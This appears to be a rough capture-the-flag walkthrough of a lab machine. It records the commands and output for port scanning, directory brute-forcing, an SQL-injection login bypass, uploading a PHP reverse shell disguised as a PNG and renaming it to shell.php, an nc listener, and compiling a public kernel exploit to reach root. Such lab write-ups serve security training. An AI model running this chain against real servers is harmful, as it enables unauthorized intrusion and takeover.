@@ -1,0 +1,206 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 17:40 EDT
+Nmap scan report for 10.10.10.6
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
+|_http-server-header: Apache/2.2.12 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.6 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.6
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/12 17:42:30 Starting gobuster
+===============================================================
+/index (Status: 200)
+/test (Status: 200)
+/torrent (Status: 301)
+/rename (Status: 301)
+
+
+all interesting info
+/test is the phpinfo, which tells me a lot stuff, but we will come back to here
+
+/rename is more intersting, it shows following
+
+Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
+
+
+OK, so we probably need to find a file or upload a file then rename it
+
+
+/torrent is all the intersting stuff for a torrent server
+
+do another scan on that
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.6/torrent --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.6/torrent
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/12 18:12:04 Starting gobuster
+===============================================================
+/images (Status: 301)
+/download (Status: 200)
+/login (Status: 200)
+/templates (Status: 301)
+/rss (Status: 200)
+/users (Status: 301)
+/admin (Status: 301)
+/health (Status: 301)
+/browse (Status: 200)
+/comment (Status: 200)
+/upload (Status: 301)
+/index (Status: 200)
+/css (Status: 301)
+/edit (Status: 200)
+/lib (Status: 301)
+/database (Status: 301)
+/secure (Status: 200)
+/js (Status: 301)
+/logout (Status: 200)
+/preview (Status: 200)
+/config (Status: 200)
+/readme (Status: 301)
+/thumbnail (Status: 200)
+/torrents (Status: 301)
+[ERROR] 2020/07/12 18:12:45 [!] Get "http://10.10.10.6/torrent/55085": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/validator (Status: 200)
+/hide (Status: 200)
+/PNG (Status: 301)
+
+
+
+the upload shows some png files
+
+
+using the burp with /login on sql injection, get a lot of 200, and somehow when I refresh it, I'm admin now
+
+
+admin and upload files, and upload screenshot
+
+use the php reverse file (modify to my ip) then change to png to upload
+
+
+Index of /torrent/upload
+[ICO]	Name	Last modified	Size	Description
+[DIR]	Parent Directory	 	-
+[IMG]	723bc28f9b6f924cca68ccdff96b6190566ca6b4.png	17-Mar-2017 23:06 	58K
+[IMG]	e73108cbd628fee5cf203acdf668c5bf45d07810.png	13-Jul-2020 01:26 	5.4K
+[IMG]	noss.png	02-Jun-2007 23:15 	32K
+
+
+now renmae it , it want the absolute path, phpinfo come handy now
+
+http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/e73108cbd628fee5cf203acdf668c5bf45d07810.png&newfilename=/var/www/torrent/upload/shell.php
+
+shows "OK!"
+
+now we have this
+
+Index of /torrent/upload
+[ICO]	Name	Last modified	Size	Description
+[DIR]	Parent Directory	 	-
+[IMG]	723bc28f9b6f924cca68ccdff96b6190566ca6b4.png	17-Mar-2017 23:06 	58K
+[IMG]	noss.png	02-Jun-2007 23:15 	32K
+[ ]	shell.php	13-Jul-2020 01:26 	5.4K
+
+
+our shell.php is there
+
+
+
+kali@kali:~$ nc -nlvp 1234
+listening on [any] 1234 ...
+
+
+now we reaady
+
+
+$ cd george
+$ ls -al
+total 872
+drwxr-xr-x 3 george george   4096 Mar 17  2017 .
+drwxr-xr-x 3 root   root     4096 Mar 17  2017 ..
+-rw------- 1 root   root     2769 May  5  2017 .bash_history
+-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
+-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
+drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
+-rw------- 1 root   root     1571 Mar 17  2017 .mysql_history
+-rw------- 1 root   root       19 May  5  2017 .nano_history
+-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
+-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
+-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
+-rw-r--r-- 1 george george     33 Mar 17  2017 user.txt
+
+
+sudo -l doesn't show anything
+
+the suid doesn's show anything interesting either
+
+$ uname -a
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+
+
+kali@kali:~/Downloads$ searchsploit privilege | grep -i linux | grep -i kernel
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation         | linux/local/15704.c
+
+
+
+drwxr-xr-x  4 www-data www-data 4096 Jul 13 02:29 .
+drwxr-xr-x 15 root     root     4096 Mar 17  2017 ..
+-rwxrwxrwx  1 www-data www-data  952 Jul 13 02:17 14273.sh
+-rwxrwxrwx  1 www-data www-data 3125 Jul 13 02:11 14339.sh
+-rw-rw-rw-  1 www-data www-data 3125 Jul 13 02:11 14339.sh.1
+-rw-rw-rw-  1 www-data www-data 9487 Jul 13 02:27 15704.c
+-rw-r--r--  1 www-data www-data  177 Mar 17  2017 index.html
+drwxr-xr-x  2 www-data www-data 4096 Mar 17  2017 rename
+-rw-r--r--  1 www-data www-data   21 Mar 17  2017 test.php
+drwxr-xr-x 15 www-data www-data 4096 Mar 17  2017 torrent
+
+
+$ gcc 15704.c -o 123
+$ ./123
+
+1
+/bin/sh: 1: not found
+whoami
+root
+
+
+
+the 14339 doesn't work because it doesn't have a PTY
+
+
+
+
+$ python -c "import pty;pty.spawn('/bin/bash')"
+
+
+this suppose to give a better shell, but it still fail
